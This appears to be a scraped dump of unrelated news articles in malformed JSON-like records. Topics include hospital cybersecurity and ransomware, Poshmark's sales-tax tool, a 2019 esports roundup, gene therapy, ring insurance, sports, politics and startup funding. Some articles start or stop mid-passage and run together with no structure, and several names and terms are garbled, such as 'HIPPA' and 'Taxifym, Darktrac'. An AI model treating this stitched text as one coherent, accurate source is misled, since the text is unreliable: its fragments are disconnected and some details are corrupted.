error opens holes in systems, as well: on the data privacy side, most breaches were triggered by employee mistakes or unauthorized disclosures, according to research published in JAMA Internal Medicine . \nWhat\u2019s more, experts say that hospitals often don\u2019t know what systems run on the devices that they use every day. \u201cWhen WannaCry hit, hospitals were scrambling to figure out which medical devices were impacted,\u201d says Christian Dameff, cybersecurity researcher and informatics fellow at the University of California San Diego Health. \u201cThese devices are often black boxes to hospitals.\u201d \nThat\u2019s not to say that hospitals aren\u2019t paying any attention to their computing systems. It\u2019s just that their focus tends to be on a different kind of security. Data security practices in place in hospitals usually prioritize protecting patient privacy, because organizations can be fined under HIPPA for exposing patient data. \u201cIt allows them to gloss over [the fact] that devices that may not have patient health info are subject to the same risks,\u201d says Jeff Tully, a cybersecurity researcher and physician at the University of California, Davis Medical Center. \nCompounding the issue, the vast majority of hospitals don\u2019t have full-time cybersecurity employees, Dameff says. \u201cThere\u2019s a lack of awareness, and there\u2019s a lack of resources,\u201d he says. Small, rural hospitals in underserved communities, he notes, probably don\u2019t have the money to hire staff or update their systems. And without security staff, they might not be aware of or able to implement security updates announced by a device company. \nWithout a protective bulwark, it can be tricky for the people already on staff to even notice that they\u2019re under attack. Nurses and doctors, who already have a lot on their plates, might not recognize a hacked device. If, say, an infusion pump delivering a drug was infected with cryptocurrency-harvesting malware, which slowed medication delivery, that device might just be yanked out of a patient room and replaced with the same model, Dameff says, a solution that wouldn\u2019t address the underlying problem and could affect patient care. \n\u201cOne of the scariest things would be a medical device with a vulnerability, but the device is unpatchable,\u201d Dameff says. \u201cWhat can we do? What do we tell patients?\u201d A hospital isn\u2019t forced by any regulatory body to update their equipment \u2014 and it might not be feasible for them to do so. If a piece of equipment costs $4 million and can\u2019t be fixed, the hospital might not be able to afford to replace it with something new, he says. \u201cThey might say, \u2018We don\u2019t have a choice.\u2019\u201d \nCaring for patient care \nIn November, the computer systems at the East Ohio Regional Hospital and Ohio Valley Medical Center suddenly stopped working. They\u2019d been hit by a ransomware attack \u2014 forcing the hospitals to divert patients from the emergency room and return to a paper charting system. Staff had trouble accessing bedside ultrasounds and had limited access to CT scans, says Neal Aulick, medical director for emergency services at the hospitals. It was a difficult time, but Aulick notes that \u201clooking back to when we were down, we didn\u2019t see bad outcomes, I think we handled it very well,\u201d he says. \nThere\u2019s a tension between cybersecurity experts who want to secure hospital systems and doctors who are focused on patient care. It\u2019s key for clinicians to understand the importance of cybersecurity, because they\u2019re in direct contact with the patients using and affected by medical devices, but it can be a hard sell for busy clinicians. And without hospital and physician engagement, Dameff says, all the efforts that the FDA and medical device companies put into improving cybersecurity fall short. It\u2019s what he calls the last mile problem: \u201cIt\u2019s that last step where a provider or hospital would have to find a problem, or deploy a [software] patch. That\u2019s really hard,\u201d he says. \u201cWe\u2019ll have all this great work like we\u2019re supposed to, but then a doctor doesn\u2019t install the update.\u201d \nAs an emergency medicine physician and medical director, Aulick says that he recognizes the risks of internet-connected systems, but says that has to be balanced against the benefits of the speed and information for which they allow. \u201cWhen you have a breach like this, the response is exaggerated,\u201d he says. Cybersecurity teams will beef up security with additional passwords or authentication, which makes systems safer, but might also slow down treatment. \nSung Choi, assistant professor at the University of Central Florida department of health management and informatics, says that\u2019s a common physician response. \u201cHospitals try to improve security, but in practice, these measures can get bypassed by clinicians, and then they\u2019re not as effective,\u201d he says. \u201cSecurity adds inconvenience by design. The next step is figuring out how to improve it without the inconvenience.\u201d \nAnd it really can be inconvenient. Even attacks on patient privacy, which might seem separate from patient care, can affect health: Choi\u2019s research shows that data breaches increase a hospital\u2019s 30-day mortality rate. That might be because the efforts organizations make to recover after a data breach can affect normal operations and pull resources away from patient care. \u201cIt introduces a lot of changes to a hospital,\u201d he says. \u201cThey might need to upgrade software, or retrain staff, and that might affect the clinical workflow.\u201d \nThat\u2019s exactly what worries physicians like Aulick. And one of the most difficult tasks that cybersecurity experts face is communicating the importance of a growing and relatively new problem. The fact is, there just isn\u2019t a lot of research that has looked into patient health during and after cybersecurity attacks on hospitals. \nBut there are some analogies. In 2017, research published in the New England Journal of Medicine found that people who had heart attacks and were taken to the hospital when a marathon was going on were more likely to die within the month than people taken to the hospital on another day: likely because road closures and a diversion of resources created delays in patient care. It\u2019s an imperfect comparison, Tully says, but it\u2019s what concerns cybersecurity experts when they think about ransomware attacks. \u201cAnything that results in the delay or degradation of care will affect outcomes,\u201d he says. \nFraming cyberattacks as safety issues helps experts get physicians and clinicians on board with good cybersecurity practices, when they might otherwise think of it as just an administrative concern, Monson says. \u201cTelling more stories about the impact on the safety of patients resonates with physicians,\u201d she says. \u201cIf we\u2019re not talking about it as patient safety, it\u2019s a lower likelihood physicians will understand how it implicates them.\u201d \nSubstantially addressing cybersecurity in health care situations isn\u2019t going to be easy, and will take cooperation from everyone from doctors to nurses, to IT professionals and manufacturers. In practice, that might look like adding cybersecurity training to medical schools, or ramping up the use of simulations that place clinicians like Pugsley in situations mimicking a cyberattack. \u201cWe don\u2019t want to turn clinicians into hackers,\u201d Dameff says, \u201cbut is it reasonable to have an hour or two or more of cybersecurity training and patient safety as a part of medical school?\u201d \nEducation on the physician end is important, and Monson notes incentives for hospitals to invest are going to be key, as well. \u201cAnd at some point, we\u2019re going to need regulatory intervention to push the dial,\u201d Monson says. \u201cIt doesn\u2019t seem like voluntary is working. For patient safety, we shouldn\u2019t be taking the chance.\u201d \nRight now, if something like WannaCry hit the United States, Woods says that our hospital infrastructure would be unprepared. \u201cWe\u2019d have to make up a response on the fly.\u201d The ongoing work to try to bring health care up to speed on best practices is exciting, and there\u2019s demand for information from patients and investors. But lives are still at risk, he says. \u201cThere\u2019s a lot going on. My fear is that it won\u2019t be fast enough.\u201d",

      "text": "The new tool is rolling out in 45 states, five territories and other local jurisdictions where laws have passed since the Supreme Court ruling. Manish Chandra, founder and CEO of Poshmark, said the company is integrating Posh Remit into its \u201ccore platform,\u201d to take care of its sellers and make it easier for them to continue doing business. \n\u201cOur mission has been to democratize retail and make it very easy for anyone to access being a retailer,\u201d Chandra said. \u201cWith this [new tool], we in a way finished our platform road map\u2014everything from payments to shipment to dispute management to authentication\u2014so [that our sellers] can really focus on merchandising.\u201d \nPosh Remit is joining the suite of tools Poshmark offers to every seller like Posh Post, which gives sellers prepaid and preaddressed shipping labels for certain items. The tools are free to use, with Poshmark only receiving a 20 percent cut of each sale (or a minimum of $2.95). By incorporating Posh Remit into the suite, Chandra said sellers won\u2019t need to worry about all the specific regulations in each state or jurisdiction, and the tool is a product he said sellers had been asking for for a long time. \n\u201cIt\u2019s a fairly complex process for the seller to figure it out,\u201d Chandra said. \u201cNo one has really taken the step to do it seamless in every jurisdiction. We are fulfilling their local obligations.\u201d \nEvelyne Teman, a Poshmark seller with close to $1 million in sales, thinks it\u2019s great that the company is bringing the tool to sellers and doesn\u2019t think buyers are going to get upset about it. \n\u201cAs a business owner, I think it\u2019s fabulous that they\u2019re doing this because it takes a lot of stress out myself,\u201d Teman said. \nPoshmark isn\u2019t alone in figuring out how to handle the ruling. In January, Etsy wrote a blog post detailing when it would collect and remit sales tax for sellers. Similarly, Poshmark is announcing the tool today to educate its sellers and buyers about the changes before it officially rolls out on April 1. \n\u201cOur overarching principle when we\u2019re offering anything new is simplicity and fairness,\u201d Chandra said. \u201cIn this case, I feel like we worked hard to deliver that to our sellers and our entire community.\u201d",

      "text": "2019 is all but over and you\u2019d be mistaken to think that it wasn\u2019t another big year in the esports industry. With some of the biggest non-endemic brands getting involved and astronomically-valued investment rounds being closed, it\u2019s sometimes helpful to take a step back to truly appreciate what\u2019s occurred. \nWith that in mind, we\u2019ve picked what we deem to be the biggest, or most important, story from each month in 2019 to look back over the monumental year that esports has had. \nWe have a twice-weekly newsletter that informs you of every significant happening in the business and industry side of esports, feel free to subscribe here . \nJanuary \nTeam Liquid adds Honda as official automotive sponsor \nIn January, Team Liquid announced Honda as its official vehicle and official automotive sponsor. \nThe organisation\u2019s LCS team jersey featured Honda\u2019s logo and the roster had a fleet of branded Honda Civics to drive to and from training. The automotive giant also produced a six-part video series titled \u2018Level Up\u2019 which followed the organisation\u2019s rosters in League of Legends, Dota 2, and Fortnite. \nRead the full article here . \nFebruary \nNike and TJ Sports sign four-year partnership deal for LPL \nNike China and the Chinese League of Legends Pro League (LPL) announced a four-year partnership and later launched team kits for each side. \nAll of the jerseys had a similar design, with the Nike logo on the right side and a team logo on the chest, but each has its own unique elements. Invictus Gaming, for example, has a gold star above its logo to represent its victory at the World Championship in 2018. \nRead the full article here . \nMarch \nComplexity Gaming announces GameStop Performance Center \nNorth American organisation Complexity Gaming unveiled the GameStop Performance Center, its 11,000-square-foot headquarters in Frisco, Texas. \nThe facility has an innovation lab sponsored by Herman Miller , a mind gym in partnership with HyperX and Mamba Soorts Academy , a player lounge sponsored by MillerCoors , and plenty of features for both its professional players and the general public. \nRead the full article here . \nApril \nWill Smith invests as Gen.G announce $46m funding round \nGen.G esports received a round of funding that saw it raise $46 million (\u00a335 million) from the likes of Will Smith and Japanese soccer player bac Dreamers Fund. \nThis was undeniably one of the biggest raises in esports to date and saw major figures from entertainment and traditional sports stake their claim in the industry. While we didn\u2019t see much from Smith about his involvement in Gen.G, his presence alone was enough to open eyes and signal the current state of development that esports is in. \nRead the full article here . \nMay \nTurner \u201cTfue\u201d Tenney files lawsuit against FaZe Clan \nProfessional esports player and personality Turner \u201cTfue\u201d Tenney filed a lawsuit against his organisation at the time, FaZe Clan \u2013 one of the biggest names in gaming and esports \u2013 due to what was claimed to be violations of the Californian law and the Talent Agency Act. \nThe narrative from this case reverberated across the entire esports industry and seeped into the larger entertainment sector, signalling that a change was to come. With organisations big and small looking to get the most from players and personalities, a push for such individuals to enforce fair and mutually-beneficial contracts happened throughout the rest of 2019. \nRead the full article here . \nJune \nImmortals officially acquires Infinite Esports & Entertainment \nImmortals Gaming Club acquired Infinite Esports & Entertainment, the parent company of OpTic Gaming, OpTic League of Legends, and Houston Outlaws. \nSignificantly, this was a large-scale move that saw a major ownership group in esports acquire what was one of the most popular organisations in the entirety of the industry. With Infinite Esports & Entertainment also owning franchises in two different leagues, this was a unique transaction and marked the end of OpTic Gaming as fans knew it . \nRead the full article here . \nJuly \nThe International 2019 raises largest prize pool in esports history \nValve reclaimed the title of running the event with largest prize pool in esports once again with The International 2019, raising a total of $34,330,068 (\u00a325,733,475.67). \nWhile it\u2019s no surprise that TI9 continued the trend of the series topping the previous year\u2019s prize pool, it\u2019s worth noting as Epic Games sprung into the race in 2019. The Fortnite World Cup , the groundbreaking title\u2019s flagship event, boasted a $30 million (\u00a322,487,700) prize pool. \nRead the full article here . \nAugust \nRiot Games confirms exit of Echo Fox from LCS \nRick Fox\u2019s separation from Echo Fox was widely publicised and was something most esports fans hadn\u2019t witnessed before: a major figure had encountered struggles with his ownership group partners. \nWhat followed certainly was\u2019t expected earlier in the year: Echo Fox ceased operations, but only after it was revealed that a shareholder used racist remarks. As the organisation failed to oust the shareholder in the allotted 60 days given by Riot Games, the developer sold its spot to Evil Geniuses \u2013 indicating that it will indeed part with business partners if needed. This was a major eye-opening incident \nRead the full article here . \nSeptember \nLouis Vuitton partners with League of Legends World Championship \nFrench fashion house and luxury retail company Louis Vuitton collaborated with Riot Games for this year\u2019s League of Legends World Championship. \nNot only did the partnership result in a luxurious trophy case, Louis Vuitton designed a high-range clothing collection based on the popular MOBA and a series of in-game skins for select champions. This is the first case of a major fashion brand integrating into the scene in such a big way and potentially signalled a more highbrow segment of the industry being formed. \nRead the full article here . \nOctober \nMLG co-founders launch esports infrastructure platform Vindex \nEsports infrastructure platform Vindex was launched with $60 million (\u00a346.6 million) in funding following its Series A round, incorporating production company Next Generation Esports and turnkey operations company Esports Engine. \nThis was a significant announcement in the world of esports as it marks the reunion of MLG\u2019s founding figures and original employees under a new brand. Seemingly picking up where MLG left off, and then some, we fully anticipate that Vindex and Esports Engine will be some of the biggest names in the events space from 2020 onwards. \nRead the full article here . \nNovember \nHouston Outlaws acquired by Beasley Media Group \nFollowing from the sale of Infinite Esports & Entertainment to Immortals Gaming Club, Beasley Media Group acquired Overwatch League franchise Houston Outlaws. \nThis was a significant acquisition as it marks the entrance of a new major ownership group into the industry, and is the first instance of an Overwatch League franchise changing ownership since the competition\u2019s inception. With homestand events coming in 2020 , the Outlaws will be located in Houston and needs all the support it can get to put on solid events for Overwatch fans and the local Houston market. \nRead the full article here . \nDece mber \nBilibili reportedly acquires Chinese broadcast rights for LoL Worlds \nLive streaming platform Bilibili acquired the exclusive Chinese broadcast rights for the League of Legends World Championship. \nBilibili obtained the rights for three years following a fierce bidding war with competitors DouYu, Huya, and Kuaishou.

      "title": "Top biotech executives say this is the 1 challenge that startups flooding into gene therapy could face",
      "text": "Reuters \nNew drug companies are flooding into the promising field of gene therapy because of its tremendous potential to treat disease at its genetic root cause. \nBut the field has also long been plagued by issues of patient safety, something that top biotech executives said continues to be a problem to this day. \nThe executives, from Spark Therapeutics , AveXis, and Bluebird Bio , talked about how their companies navigated this challenge at the Gene Therapy for Rare Disorders conference in Boston on Wednesday. \nA decades-old scientific technology that targets disease at its genetic root has come of age. New start-ups are pouring into the space \u2014 and becoming major acquisition targets . \nTop executives from Spark Therapeutics , Bluebird Bio, and AveXis spoke on Wednesday about the challenges they faced to become three of the most prominent biotechs in the space, as part of the Gene Therapy for Rare Disorders conference in Boston. \nSpark was acquired by Swiss drug giant Roche earlier this year for nearly $5 billion. Another large Swiss drugmaker, Novartis, bought AveXis last year for nearly $9 billion. \nThe field has faced serious, longterm challenges around patient safety to get where it is today, and it was a key issue the executives quickly pointed to. \nGene therapies are incredibly complex medicines, and startups can\u2019t make assumptions about how their products will work based on how other, similar therapies work, or even based on how their products do when tested out in animals like mice or monkeys, many of the experts said. \n\u201cYou really have to know your own product,\u201d said Spark Therapeutics\u2019 cofounder, president and chief scientific officer Katherine High. \nAvoiding a potentially deadly immune-system response \nGene therapies often involve taking a patient\u2019s own cells and making a change at the genetic level to target the source of their disease. \nBecause of this, though, they can trigger a harmful, and possibly deadly response from the patient\u2019s immune system , which is designed to recognize foreign substances in the body in order to fight disease. \nTo predict for that type of response, scientists test out experimental therapies in non-humans first, like mice and monkeys. But those models haven\u2019t always predicted how human bodies will respond, Spark\u2019s High and AveXis\u2019s Chief Scientific Officer Brian Kaspar said. \n\u201cI think we were all surprised\u201d by that, High said, adding that the issue likely also posed challenges for the scientists who developed organ transplants, which similarly trigger a life-threatening immune response in the body. \nAveXis confronted this by working hard to understand how their products did in each type of animal model, for example, Kaspar said. \n\u201cMany people do a mouse study and essentially wave their hands at human models,\u201d he said. But \u201cwe go through the same process each and every time, on each and every program.\u201d ",

      "title": "Here's what you need know about insuring an engagement ring",
      "text": "Katie Warren/Business Insider \nPurchasing an engagement ring is often a big expense. By also purchasing insurance, you can be sure you don\u2019t pay out of pocket for repairs or to replace the ring if you lose it. \nThe best thing to do is to purchase insurance right away: Once you officially make the purchase, you can go ahead and add it to your insurance policy. \nInsurance options include adding a personal property/jewelry rider to your home insurance or renter\u2019s insurance policy. If you don\u2019t have either of these, you can insure the piece separately through a reputable insurance agency or a company like Jeweler\u2019s Mutual. \nVisit Business Insider's homepage for more stories . \nPurchasing an engagement ring is often a big financial decision. \nThough engagement rings can range in cost from hundreds to thousands of dollars, it's a good idea to purchase insurance as one of the first matters of business. Here's what you should know about how to insure your engagement ring. \nFind the best provider and policy for you \n\"Insurance is very important,\" says Peter Meksian, CEO of Michael M , a Los Angeles-based luxury bridal and fashion jewelry company. \"Most 'home' insurance policies cover jewelry and watches to a certain amount. If you do not have a homeowner's or renter's insurance policy, you can always get an insurance policy from Jewelers Mutual, who specialize in personal jewelry policies.\" \n\"You would not own a car without insurance \u2014 insure your jewelry,\" Meksian added. \nIf you already have homeowner's insurance or renter's insurance, it's likely the policy covers jewelry and watches up to a certain value, but it might not be for the full amount of the engagement ring. If that\u2019s the case, you\u2019ll be able to add personal property \u2014 such as an engagement ring \u2014 as a rider to the policy. The cost varies based on the cost of the ring and the provider. \nInsure the piece as soon as you can \nExperts suggest purchasing insurance before taking possession of the ring. If that's not possible, insurance should be purchased right when you receive the ring. \n\"Consumers should insure any piece of jewelry that they would not be able to replace on their own if it were lost or stolen. That amount differs from person to person, but can be as little as $1,000,\u201d says Oded Edelman, President and co-founder of JamesAllen.com . \n\"You also need to find out if the policy covers you fully if the item is damaged or lost outside of the United States,\u201d says Edelman. \u201cYou\u2019re probably more likely to be exposed to theft or lose your ring when you\u2019re traveling, so this question is key and many policies will have riders that don\u2019t allow this level of coverage. Finally, ask if your jewelry is covered at the full replacement cost and if you can receive a cash settlement instead of a replacement item.\" \nGather the right information for the provider \nIn order to successfully insure the ring, you will need several items of documentation. \nAppraisal: Most insurance companies will require an appraisal on the piece if it's of significant value. An appraisal will include details like the 4 C\u2019s: carat weight, cut, clarity and color, and should be done by a reputable company. Though the piece may appraise for slightly higher than you paid, you'll want it close because a higher appraisal may mean a higher insurance premium. Note: You may want to reappraise every few years to make sure the value is correct. \nGrading Report: The jeweler may also provide a grading report, like those from GIA, the Gemological Institute of America. This will also list the specifications of the diamond or precious stone, but it is not an appraisal. Rather, it will help the appraiser determine the value and thus would be good to submit with the insurance policy. If the ring were to be damaged or lost, the grading report would be used to determine a suitable fix or replacement for the piece. \nPhotos: Along with your appraisal and grading report, you may also want to submit photos of the ring to the insurance company so the specifications are met with an exact visual of the piece. This will also aid in helping to repair or replace the item, should you need to. ",

      "text": "WATFORD, England (AP) \u2014 Watford has hired Nigel Pearson as manager in the hope his experience of an English Premier League relegation struggle can ensure the team\u2019s survival. \nThe team has won only once in 15 matches this season and sits at the bottom of the standings, leading to Quique Sanchez Flores being fired less than three months into his second spell as manager. \nThe 56-year-old Pearson has been hired until the end of the season but won\u2019t be in charge for Saturday\u2019s game at Crystal Palace. Pearson ensured Leicester stayed in the Premier League in 2015 when the team\u2019s prospects looked bleak. He left before the team\u2019s improbable run to the title a year later. \nHe arrives at a Watford side eight points from safety. \n\u201cNigel is an impressive coach and comes with all of the experience and success we believe can have a very positive impact on our season,\u201d Watford chairman and CEO Scott Duxbury said. \u201cIt\u2019s been a pleasure spending time listening to the passion with which he talks about the game. \n\u201cHis enthusiasm, organisation, and motivation will, I\u2019m certain, prove essential in driving the team forwards and upwards over the coming weeks and months.\u201d \nPearson\u2019s most recent job was at Oud-Heverlee Leuven. \n\u201cI\u2019d like to thank Hayden Mullins for stepping in to coach the team on an interim basis. He is fully deserving of everyone\u2019s gratitude,\u201d Duxbury added. \n\u201cTomorrow gives the perfect opportunity for Nigel to be officially introduced to our supporters as Hayden leads the team in the quest for a very important three points.\u201d",

      "text": "Bryan Bedder/Getty Images \nIn a recent interview with Business Insider's Kate Taylor, former Starbucks CEO Howard Schultz discussed his potential run for office . \nSchultz said that on the question of the age requirement that allows young politicians \u2014 such as 29-year-old Rep. Alexandria Ocasio-Cortez \u2014 to run in the next presidential election, he yields to the Constitution. \nThe Constitution sets a 35-year age minimum for presidential candidates. \nOn the topic of age restrictions, Howard Schultz yields to the Constitution. \nWhen Business Insider's Kate Taylor asked Schultz if he thought it was fair that young politicians \u2014 such as Rep. Alexandria Ocasio-Cortez \u2014 are unable to run for president, the Starbucks' founder and former CEO deferred to the Constitution. \n\" I would just yield to the Constitution that I think has served the American people well for a number of years,\" Schultz told Business Insider. \nSince gaining popularity during the 2018 midterm elections, 29-year-old Ocasio-Cortez's age has come into question. Currently, candidates need to be 35 years old to run for office, making Ocasio-Cortez six years too young and an ineligible candidate for the upcoming 2020 election. Age has been discussed on the opposite end of the spectrum as well, as several candidates are currently in their late seventies. \nSchultz added that upholding this restriction is not about one person, and stated that the next president's experience \u2014 both life experience and professional experience \u2014 are crucial to succeed in office. \n\"We need the right person to be the next president of the United States, to navigate through a series of issues, serve the American people well, restore our standing in the world, and elevate the issues that we have discussed, specifically the level of inequality,\" said Schultz. \"And I think most of all, restore trust and confidence in the promise of the country in leadership, in institutions, and in our government. Once again, I think we're talking about leadership, servant leadership. The next president of the United States needs to serve the American people, every single person. \nRead the full interview here . ",

      "text": "Ecuador's government may be facing virtual retaliation for its decision to allow Julian Assange's arrest . The country's deputy minister for information and communication technologies, Patricio Real, claimed that its institutions' websites had faced 40 million cyberattacks in the days since it effectively turned Assange in. The denial of service attacks flooded a number of major targets, including President Moreno's office, the internal revenue service and the central bank. \nThere was no one clear point of origin for the reported attacks. Real said they \"principally\" came from the US, UK, Austria, Brazil, France, Germany, the Netherlands, Romania and even Ecuador. There don't appear to have been any attempts (successful, at least) to delete or steal data. \nEcuador was considered Assange's closest ally under former President Rafael Correa, who granted asylum to the WikiLeaks founder in his country's London embassy and rejected the UK's claims that it had authority to arrest Assange on embassy grounds. All that changed when Ecuador elected Moreno, however. He saw Assange as an \"inherited problem,\" and the embassy gradually curbed his internet access along with other privileges. The threat of expulsion had been lingering for nearly a year before Ecuador permitted Assange's arrest. In that light, cyberattacks wouldn't be surprising -- Assange's supporters have been bracing themselves for this possibility for years. \nVia: Gizmodo \nSource: AFP (France 24)",

      "text": "The NHL suspended Toronto Maple Leafs center Nazem Kadri on Monday for the remainder of their first-round playoff series, following his high hit on Boston Bruins winger Jake DeBrusk on Saturday. \nKadri received a major penalty for cross-checking and a game misconduct after the incident late in the third period of Game 2. DeBrusk was standing near the boards when Kadri hit him high with his stick, knocking him to the ice. \nGame 3 is Monday night in Toronto. \nThe NHL Department of Player Safety issued its ruling following an in-person hearing. The Department of Player Safety said it considered Kadri a repeat offender. This is Kadri's fifth career suspension and the second in the playoffs in as many seasons, as he was suspended three games a year ago for boarding Boston's Tommy Wingels . \nAs a repeat offender, Kadri will lose a larger percentage of his average annual salary. \nKadri has 48 hours to alert the league if he plans to appeal the decision. \nKadri's hit on DeBrusk could be seen as retaliatory. In the second period, DeBrusk collided with Kadri in what appeared to be a knee-on-knee hit. Kadri was down on the ice for several minutes and had to exit the game. No penalty was called on the play. \nKadri scored the Leafs' only goal as the Bruins won 4-1 to tie the series at one game apiece. \nToronto coach Mike Babcock said ahead of the suspension ruling that he would play either William Nylander or Patrick Marleau in Kadri's slot as the team's third-line center.",

The said appointment is subject to approval of the Shareholders of the Company. \nMs. Duggal does not hold any shares in the Company. None of the Directors are related to Ms. Duggal. Ms. Duggal is not debarred or disqualified from holding the office of Director by virtue of any order from SEBI/MCA or any such statutory authority. \nMs. Anjuly Chib Duggal, a 1981 batch IAS Officer (Punjab cadre), retired as Secretary of Department of Financial Services, Ministry of Finance, Government of India, in 2017.

      "title": "Europe\u2019s high-growth ecosystem is strong, and weathering global storms",
      "text": "Europe\u2019s high-growth ecosystem is strong, and weathering global storms \nAround 10 years of ecosystem development has left European high-growth companies in a much stronger position counter to their global rivals, according to new research from the FT and Statista dubbed the FT 1000 . And in the realm of tech startups, they continue to create the software which is, famously, eating the world. \nDespite trade wars, Brexit and a European economic slowdown, tech companies in Europe are still thriving. In fact, some are positively booming. Key companies named in the list include Deliveroo, Taxifym, Darktrac, Buzzoole and Perkbox. \nAs the report implies, tech is simply in a different economy to the normal economy, and the reasons are simple: Disrupters are better protected even if economic conditions deteriorate because many are created simply to take market share from incumbent businesses. Even as these incumbent businesses feel the headwinds of the real economy, tech companies are side-stepping them, whether it be via AI, automation or just sheer faster growth. \nThe lowest ranked company to make the list had a compound annual growth rate in revenue of 37.7 percent, up from 34.6 percent last year. \nSpeaking to the FT, Toby Coppel, partner at London-based Mosaic Ventures, said the ecosystem is maturing: \u201cThere are many more successful companies like Spotify where the next generation of founders are trained and then leave to start-up the next company, often with former colleagues [to start something new].\u201d \nOphelia Brown, founder of Blossom Capital, said founders no longer up sticks and move to Silicon Valley, while Brent Hoberman of Founders Forum says they have counted 36 new unicorns in Europe and Israel last year. \nHowever, Brexit is clearly having an effect: U.K. startups are seeking licenses and opening HQs or major offices elsewhere in Europe to offset the risks of talent or funding becoming scarcer in Brexit Britain. Plus, there is very little data on the startups and entrepreneurs that have simply decided to stay away from the U.K. during this chaotic Brexit period. \nAs Philippe Botteri of Accel says: \u201cThe Brexit impact will be people.\u201d \nOther issues tech companies face in Europe will sound familiar to U.S. ears: The \u201ctechlash\u201d by regulators and privacy concerns to name two. But others, like accessing a large single market, remain a challenge for Europe to pull together, and are not problems U.S. startups have to face nearly as much. \nHowever, European tech companies are also in an equally good place as concerns the hottest new technology trend, such as the growing use of big data in fintech and healthcare, robotics and food delivery, AI and quantum computing.",

You throw a punch, you better take a punch,\u201d the California Democrat told CBS\u2019 \u201c60 Minutes\u201d in an interview that aired Sunday. \nPelosi attended a photo-op in the White House on Dec. 11 with Trump and Senate Majority Leader Chuck Schumer that suddenly turned into a very public squabble in which the president challenged Pelosi on locking down a vote on her speakership because of possible defections from progressives in the party. \n\u201cYou know, Nancy\u2019s in a situation where it\u2019s not easy for her to talk right now,\u201d Trump said at the meeting. \n\u201cMr. President, please don\u2019t characterize the strength that I bring to this meeting as a leader of the House Democrats who just won a big victory,\u201d she shot back at the commander-in-chief, referring to Democrats winning control of the House in the November mid-term elections. \nCBS\u2019 Lesley Stahl told Pelosi that she appeared to be one of the few people who stood up to Trump and won. \n\u201cNo, people do.

      "title": "This New Animal-Free Ingredient Company Just Raised Another $27.5 Million In Funding",
      "text": "Motif Ingredients, the company launched by synthetic biology firm Ginkgo Bioworks, announced today it has raised an additional $27.5 million in funding. The food ingredient company\u2019s Series A extension was led by global growth equity firm General Atlantic with participation from CPT Capital. Now rebranded as Motif FoodWorks, the company starts today with a new name, a new website and several new additions to its leadership team. \nLaunched in February with $90 million in financing from investors that include Fonterra, Louis Dreyfus Company, and Viking Global Investors, the company combines molecular food science with Ginkgo\u2019s synthetic biology platform to produce a wide range of ingredients for enhancing plant-based foods. \nBoosting The Taste And Nutrition Of Plant-Based Foods \nThe company has around fifteen products in the pipeline today, says Motif CEO Jon McIntyre, each of which is designed to boost either functionality, taste or nutrition, or maybe all three of these at the same time if the company gets lucky. Though all of these products are currently under development and therefore not yet public, here are a couple of examples, at least in general terms. \nOne promising category is the replication of certain beneficial milk proteins. \u201cThere are quite a few important nutritional ingredients that are found [only] in...human breastmilk,\u201d says McIntyre, and if Motif could replicate those components in a new ingredient, it could then sell it to an infant formula company to make a formula that\u2019s even closer to breastmilk. \nThe company also has its sights set on a healthier (but still tasty) plant-based burger. Explains McIntyre, if Motif could design an ingredient that does \u201ca better job of maintaining the proper structure of fat,\u201d companies like Impossible Foods or Beyond Meat could use that ingredient to reduce the amount of fat in their burgers without sacrificing flavor. \u201cOur goal would be to kill two birds with one stone,\u201d he says, \u201cimprove the taste experience and reduce the amount of fat.\u201d \nSmoothing The Path To Regulatory Affirmation \nMcIntyre has been Motif\u2019s CEO only since February but, prior to that, he spent almost ten years working in different divisions of research and development at PepsiCo. He was eager to take the helm of a food ingredient company from day one. \n\u201c[It\u2019s a great] chance to build a company from scratch,\u201d he says, especially one with a mission like Motif\u2019s, \u201ctrying to...reduce the amount of animal-based ingredients...and help people try to consume a more plant-based diet.\u201d \nThe company has also added several executives to its leadership team this financing round, including Janet Collins, who previously worked for the pesticide industry association CropLife America. \u201cShe\u2019s kind of a unicorn,\u201d says McIntyre, of Collins, since she has experience in meat, dairy and agricultural biotech. Collins will now lead Motif\u2019s regulatory affairs department, navigating each of the company\u2019s ingredients through the regulatory approval process. \nGetting FDA approval for novel food ingredients can be tricky, as Impossible Foods learned when it encountered difficulties with its heme . Each of Motif\u2019s products will need GRAS, or \u201cgenerally regarded as safe,\u201d affirmation, and McIntyre says it\u2019s important the company gets the process right from the outset. \n\u201cBeing transparent and getting all of that done right is critical,\u201d McIntyre says. And there\u2019s international regulation to consider too, which is particularly important given the huge swaths of plant-based sector growth these days worldwide, especially in countries like China and India. \n\u2018We\u2019d like to make food more nutritious\u2019 \nThe challenge is more than just regulatory, of course, says McIntyre, because Motif also needs to make sure that the naming and labeling of these ingredients makes sense from the beginning, perhaps avoiding a \u2018lab meat\u2019 to \u2018clean meat\u2019 to \u2018cultured meat\u2019 kind of story. \u201cHow do you brand and label these things...in a way that\u2019s not confusing to the consumer? And really explains what...we\u2019re providing to them and what is the benefit?\u201d \nMcIntyre is a food industry veteran, so he\u2019s seen what happens when food companies don\u2019t get it right. \u201cWe\u2019re trying to approach this in a very different way than it\u2019s been approached in the past,\u201d he says. But how exactly will that work? \n\u201cMy first objective isn\u2019t to talk all about technology,\u201d McIntyre explains, \u201cbut to talk about [questions like] what are the important problems we\u2019re trying to solve? What are the benefits to consumers and customers? And then be transparent about what we\u2019re doing, and...let the consumer uncover these things in a way that they can understand them themselves.\u201d \n\u201cIn the past, there was a lot of talking down to consumers [and] telling them why they shouldn\u2019t be concerned,\u201d he says, adding \u201cI think that\u2019s the wrong dialogue.\u201d For Motif, McIntyre says, it\u2019s important to set out what the company wants to achieve, not just what the technology can do. \u201cWe\u2019d like to make food more nutritious, we\u2019d like to have less impact on the environment [and] we want...a plant based diet to be an exciting opportunity where the food tastes wonderful and great.\u201d \nNot everyone sees plant-based diets as an exciting opportunity. Some farmers have grown particularly angry about what they see as overly aggressive marketing from plant-based companies like Impossible Foods, whose CEO recently boasted about putting farmers out of business . But McIntyre says there\u2019s no need to put down farmers in the pursuit of a more plant-based diet. \u201cI personally don\u2019t believe animal agriculture is going to go away,\u201d he says. In fact, the animal agriculture industry is trying to become more sustainable too. \u201cWhat we\u2019re trying to do is create options,\u201d says McIntyre, \u201cwith technology that allows food companies to be able to create great products that are [also] more sustainable.\u201d",

